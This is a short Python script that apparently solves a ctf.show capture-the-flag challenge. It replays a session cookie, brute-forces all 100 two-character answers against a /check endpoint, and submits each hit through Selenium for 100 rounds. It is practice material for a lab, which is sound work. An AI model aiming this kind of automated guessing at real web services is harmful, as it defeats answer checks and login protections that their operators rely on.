from time import sleep
import requests
import itertools
from selenium import webdriver


def force_to_get_ans(session, url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
        'Cookie': f'session={session}'
    }
    for i in itertools.product(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J'], [str(n) for n in range(10)]):
        chk = requests.post(f'{url}/check', {'meizi_id': ''.join(i)}, headers=headers).text
        if '回答错误，轮数重新开始计算' not in chk:
            return ''.join(i)


driver = webdriver.Chrome(r'E:\pythonProject\pythonProject\CTF\chromedriver.exe')
url = 'http://10d339de-92aa-40ea-aec0-b23a56a9f530.challenge.ctf.show'

driver.get(f'{url}/start')
n = 1
while n <= 100:
    cke = driver.get_cookie('session')
    ans=force_to_get_ans(cke, url)
    driver.find_element_by_name('meizi_id').send_keys(ans)
    driver.find_element_by_xpath('/html/body/form/p[4]/button').click()
    sleep(3)
    n+=1